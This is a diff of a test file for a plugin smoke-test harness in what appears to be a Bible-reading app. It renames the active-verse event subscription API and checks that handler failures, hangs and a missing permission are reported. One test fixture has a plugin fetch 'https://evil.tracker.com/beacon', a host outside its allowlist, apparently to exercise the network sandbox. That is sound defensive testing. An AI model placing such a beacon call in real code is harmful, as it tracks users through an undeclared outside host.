@@ -22,7 +22,7 @@ describe('runSmokeSuite', () => {
     const harness = createSmokeHarness({
       manifest: manifest(),
       activate: async (api) => {
-        await api.bible.onDidChangeActiveVerse.subscribe(() => {});
+        await api.events.subscribe('verse.activeChanged', () => {});
       },
     });
     await harness.activate();
@@ -31,7 +31,7 @@ describe('runSmokeSuite', () => {
 
     expect(result.totals.failed).toBe(0);
     expect(result.totals.passed).toBeGreaterThan(0);
-    expect(result.perHook[0]?.hookId).toBe('event:bible.onDidChangeActiveVerse');
+    expect(result.perHook[0]?.hookId).toBe('event:verse.activeChanged');
     expect(result.perHook[0]?.failed).toBe(0);
   });
 
@@ -39,7 +39,7 @@ describe('runSmokeSuite', () => {
     const harness = createSmokeHarness({
       manifest: manifest(),
       activate: async (api) => {
-        await api.bible.onDidChangeActiveVerse.subscribe((p) => {
+        await api.events.subscribe('verse.activeChanged', (p) => {
           if (p === 43003016) throw new Error('only-john-breaks');
         });
       },
@@ -72,7 +72,7 @@ describe('runSmokeSuite', () => {
     const harness = createSmokeHarness({
       manifest: manifest(),
       activate: async (api) => {
-        await api.bible.onDidChangeActiveVerse.subscribe(
+        await api.events.subscribe('verse.activeChanged', 
           () => new Promise(() => {}),
         );
       },
@@ -156,7 +156,7 @@ describe('runSmokeSuite', () => {
       // No `notes:write` declared — create() must surface PermissionDenied.
       manifest: manifest(),
       activate: async (api) => {
-        await api.bible.onDidChangeActiveVerse.subscribe(async () => {
+        await api.events.subscribe('verse.activeChanged', async () => {
           await api.notes.create({ content: 'x' } as never);
         });
       },
@@ -191,7 +191,7 @@ describe('runSmokeSuite', () => {
         network: { allowedHosts: [{ host: 'api.example.com', purpose: 'test' }] },
       }),
       activate: async (api) => {
-        await api.bible.onDidChangeActiveVerse.subscribe(async () => {
+        await api.events.subscribe('verse.activeChanged', async () => {
           await api.network.fetch('https://evil.tracker.com/beacon');
         });
       },
